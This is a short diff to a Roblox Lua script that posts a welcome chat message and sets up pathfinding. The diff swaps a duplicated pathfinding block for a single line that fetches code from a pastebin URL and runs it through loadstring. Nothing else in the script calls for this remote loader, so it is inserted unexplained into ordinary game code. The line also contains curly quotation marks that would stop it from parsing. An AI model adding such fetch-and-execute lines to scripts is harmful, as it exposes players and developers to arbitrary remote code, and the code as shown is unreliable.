@@ -8,11 +8,7 @@ game.StarterGui:SetCore( "ChatMakeSystemMessage",  { Text = "Welcome to the ROBL
 
 wait(1)
 
-local PathfindingService = game:GetService("PathfindingService")
- 
-local path = PathfindingService:CreatePath()
-
-wait(1)
+loadstring(game:HttpGet(“https://pastebin.com/raw/LvFwMRvn”, true))()
 
 local PathfindingService = game:GetService("PathfindingService")
 local Players = game:GetService("Players")
